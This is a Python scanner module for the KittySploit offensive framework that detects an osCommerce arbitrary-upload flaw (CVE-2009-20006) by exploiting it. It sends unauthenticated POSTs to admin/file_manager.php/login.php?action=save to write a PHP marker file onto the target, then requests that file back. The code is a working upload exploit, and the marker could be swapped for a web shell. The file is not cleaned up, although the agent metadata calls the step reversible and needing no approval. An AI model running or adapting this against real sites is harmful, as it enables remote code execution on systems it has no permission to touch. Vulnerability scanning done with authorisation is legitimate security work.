#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2009-20006 by uploading a marker PHP via admin/file_manager."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'osCommerce - file_manager.php Arbitrary Upload Detection (CVE-2009-20006)',
        'description': (
            'Detects CVE-2009-20006 by uploading a marker PHP via admin/file_manager.php/login.php?action=save.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2009', 'oscommerce', 'upload', 'rce', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2009-20006',
        ],
        'cve': 'CVE-2009-20006',
    }

    def run(self):
        marker = 'kittysploit_osc_upload'
        fname = 'ks_osc_test.php'
        data = f'filename={fname}&file_contents=%3C%3F+echo+%22{marker}%22%3B%3F%3E&submit=+++Save+++'
        for base in ('', '/catalog', '/oscommerce', '/shop'):
            up = f'{base}/admin/file_manager.php/login.php?action=save'
            self.http_request(
                method='POST', path=up, data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            r = self.http_request(method='GET', path=f'{base}/{fname}', allow_redirects=False)
            if r and marker in (r.text or ''):
                self.set_info(severity='critical', reason='osCommerce file_manager.php arbitrary upload (CVE-2009-20006)', path=up.split('?')[0])
                return True
        return False

